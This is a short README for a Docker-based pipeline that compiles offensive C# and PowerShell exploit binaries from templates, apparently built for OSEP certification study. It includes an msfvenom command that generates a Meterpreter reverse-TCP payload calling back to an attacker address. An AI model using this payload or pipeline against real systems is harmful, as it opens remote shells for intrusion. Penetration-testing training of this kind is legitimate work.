# Offensive C# .NET Framework and PowerShell build environment
A small project built for OSEP that provides a build environment for quickly and easily compiling and building exploit binaries based on templates.

## Prerequisites
Generate your payload file in MSFVenom raw format and save it as payload.bin in the root directory.
### Example:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -b "x00" -f raw EXITFUNC=thread -o payload.bin
```

# Usage
## Building the Docker image
To build the Docker image, run the following command in the directory where the Dockerfile is located:

```powershell
docker build -t rfc_offensive_pipeline .
```
This command will build the Docker image and tag it with the name my-csharp-app.

## Running the Docker container
To run the Docker container and compile your C# code, you can use the following command:

```powershell
docker run --rm -v ${PWD}/csharp:/app/csharp rfc_offensive_pipeline
```

This command will mount the ./csharp directory on the host machine to the /app/csharp directory inside the container, and then execute the build.sh script in the container. The compiled executable files will be written to the ./csharp/output directory on the host machine.
